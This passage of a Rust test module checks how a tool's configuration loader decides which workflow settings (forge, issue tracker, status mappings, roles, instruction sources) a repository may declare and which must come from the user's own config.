            ConfigError::Invalid { layer, key, .. } => {
                assert_eq!(layer, ConfigLayer::Repo);
                assert_eq!(key.as_deref(), Some("workflow.forge"));
            }
            other => panic!("expected Invalid, got {other:?}"),
        }
    }

    #[test]
    fn your_config_names_the_forge_and_a_repository_may_name_its_integration_branches() {
        let h = Harness::new();
        h.write_repo_config("[workflow]\nintegration_branches = [\"main\", \"release/*\"]\n");
        let project_key = h.repo.to_string_lossy().into_owned();
        h.write_user_config(&format!(
            "[projects.\"{project_key}\".config.workflow]\nforge = \"github\"\n"
        ));

        let workflow = h.store.load(&h.repo).unwrap().workflow.unwrap();
        assert_eq!(workflow.forge, Some(wtm_core::flow::ForgeKind::Github));
        assert!(workflow.is_integration_branch("release/4.2"));
    }

    #[test]
    fn a_repository_cannot_name_the_tracker_that_spends_your_sign_in() {
        let h = Harness::new();
        h.write_repo_config("[workflow]\ntracker = \"jira\"\n");

        match h.store.load(&h.repo).unwrap_err() {
            ConfigError::Invalid { layer, key, .. } => {
                assert_eq!(layer, ConfigLayer::Repo);
                assert_eq!(key.as_deref(), Some("workflow.tracker"));
            }
            other => panic!("expected Invalid, got {other:?}"),
        }
    }

    #[test]
    fn your_config_names_the_tracker_and_maps_statuses_fields_and_the_queue() {
        let h = Harness::new();
        let project_key = h.repo.to_string_lossy().into_owned();
        h.write_user_config(&format!(
            "[projects.\"{project_key}\".config.workflow]\n\
             tracker = \"jira\"\n\
             [projects.\"{project_key}\".config.workflow.statuses]\n\
             todo = [\"Backlog\", \"Ready\"]\n\
             started = \"In Progress\"\n\
             needs_review = \"In Review\"\n\
             done = [\"Done\", \"Accepted\"]\n\
             [projects.\"{project_key}\".config.workflow.fields]\n\
             sprint = \"customfield_10020\"\n\
             owner = \"customfield_10050\"\n\
             [projects.\"{project_key}\".config.workflow.queue]\n\
             query = \"assignee = currentUser()\"\n\
             board = 3\n"
        ));

        let workflow = h.store.load(&h.repo).unwrap().workflow.unwrap();
        assert_eq!(workflow.tracker, Some(wtm_core::flow::TrackerKind::Jira));
        assert_eq!(workflow.statuses.todo, ["Backlog", "Ready"]);
        assert_eq!(workflow.statuses.started, ["In Progress"]);
        assert_eq!(workflow.statuses.columns().len(), 6);
        assert_eq!(workflow.fields["owner"], "customfield_10050");
        let queue = workflow.queue.unwrap();
        assert_eq!(queue.query, "assignee = currentUser()");
        assert_eq!(queue.board, Some(3));
    }

    #[test]
    fn a_repository_may_share_the_status_mapping_while_you_name_the_tracker() {
        // The mapping is the team's words and grants nothing until your own config names a
        // tracker, so a repository may carry it for everyone who clones it.
        let h = Harness::new();
        h.write_repo_config(
            "[workflow.statuses]\nstarted = \"In Progress\"\n[workflow.queue]\nquery = \"project = ACME\"\n",
        );
        let project_key = h.repo.to_string_lossy().into_owned();
        h.write_user_config(&format!(
            "[projects.\"{project_key}\".config.workflow]\ntracker = \"jira\"\n"
        ));

        let workflow = h.store.load(&h.repo).unwrap().workflow.unwrap();
        assert_eq!(workflow.tracker, Some(wtm_core::flow::TrackerKind::Jira));
        assert_eq!(workflow.statuses.started, ["In Progress"]);
        assert_eq!(workflow.queue.unwrap().query, "project = ACME");
    }

    #[test]
    fn a_status_mapped_to_two_roles_is_a_config_error_naming_the_key() {
        let h = Harness::new();
        let project_key = h.repo.to_string_lossy().into_owned();
        h.write_user_config(&format!(
            "[projects.\"{project_key}\".config.workflow.statuses]\n\
             started = \"Doing\"\ndone = \"Doing\"\n"
        ));
        match h.store.load(&h.repo).unwrap_err() {
            ConfigError::Invalid { key, message, .. } => {
                assert_eq!(key.as_deref(), Some("workflow.statuses.done"), "{message}");
            }
            other => panic!("expected Invalid, got {other:?}"),
        }
    }

    #[test]
    fn a_repository_may_name_its_own_instruction_sources() {
        // Unlike a role, the list names only files in the repository for a review to read, which
        // anyone who could commit this file could already have written into those files.
        let h = Harness::new();
        h.write_repo_config("[workflow]\ninstruction_sources = ['REVIEW.md', 'docs/review/**']\n");
        let workflow = h.store.load(&h.repo).unwrap().workflow.unwrap();
        assert_eq!(
            workflow.instruction_sources(),
            ["REVIEW.md", "docs/review/**"]
        );
    }

    #[test]
    fn the_local_layer_may_declare_roles_because_it_is_yours() {
        let h = Harness::new();
        h.write_local_config(&RECIPE.replace("defaults.", ""));
        let workflow = h.store.load(&h.repo).unwrap().workflow.unwrap();
        assert!(workflow.recipe.contains_key("review"));
    }

    #[test]
    fn a_workflow_mistake_names_your_config_even_when_the_repository_has_a_wtm_toml() {
        let h = Harness::new();
        h.write_repo_config("[naming]\nbranch = 'ok'\n");
        h.write_user_config(&RECIPE.replace("\"conventions-codex\"\n\n", "\"nobody\"\n\n"));

        match h.store.load(&h.repo).unwrap_err() {
            ConfigError::Invalid {
                path,
                layer,
                key,
                message,
                ..
            } => {
                assert_eq!(path, h.store.paths().config_file);
                assert_eq!(layer, ConfigLayer::User);
                assert_eq!(key.as_deref(), Some("workflow.role.conventions.fallback"));
                assert!(message.contains("nobody"), "{message}");
            }
            other => panic!("expected Invalid, got {other:?}"),
        }
    }
}
